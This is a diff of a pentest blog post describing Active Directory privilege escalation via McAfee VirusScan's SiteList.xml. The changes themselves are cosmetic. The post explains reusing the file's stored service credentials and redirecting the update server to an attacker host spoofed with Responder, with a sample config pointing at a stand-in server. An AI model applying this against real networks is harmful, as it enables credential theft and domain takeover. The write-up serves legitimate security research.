@@ -2,7 +2,7 @@
 # McAfee privileged SiteList.xml leads to Active Directory domain privilege escalation
 
 During an intern pentest, I came accross a nice way to privesc in an Active Directory domain.
-I owned an employee's laptop with [*McAfee Virusscan Enterprise 8.8*](http://www.mcafee.com/us/products/virusscan-enterprise.aspx) installed and a low privilege account.
+I owned an employee's laptop with [**McAfee Virusscan Enterprise 8.8**](http://www.mcafee.com/us/products/virusscan-enterprise.aspx) installed and a low privilege account.
 
 Mcafee has a feature to customize update servers and can connect to these servers via HTTP or SMB. (***C:\ProgramData\McAfee\Common Framework\***) **SiteList.xml** contains juicy informations like credentials, internal server names, ... it looks like this :
 
@@ -70,7 +70,7 @@ The command completed successfully.
 
 Unfortunately the AV used GUI password, I couldn't edit the file. Thus, I downloaded and installed McAfee on my Windows Virtual Machine and just copied/pasted the previous precious sesame in my own SiteList.xml.
 
-At this time, I knew that It was close. I edited the file like I could force an HTTP connection to any random server that I could spoof using *Responder*. Actually the SiteList.xml looks like this :
+At this time, I knew that It was close. I edited the file like I could force an HTTP connection to any random server that I could spoof using [**Responder**](https://github.com/SpiderLabs/Responder). Actually the SiteList.xml looks like this :
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
@@ -78,7 +78,7 @@ At this time, I knew that It was close. I edited the file like I could force an 
 <SiteList Default="1" Name="SomeGUID">
 
 <HttpSite Type="fallback" Name="PWNED!" Order="26" Enabled="1" Local="0" Server="fuckingrandomserver:80">
-<RelativePath>POO</RelativePath><UseAuth>1</UseAuth>
+<RelativePath>LICORNE</RelativePath><UseAuth>1</UseAuth>
 <UserName>McAfeeService</UserName>
 <Password Encrypted="1">YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</Password>
 </HttpSite>
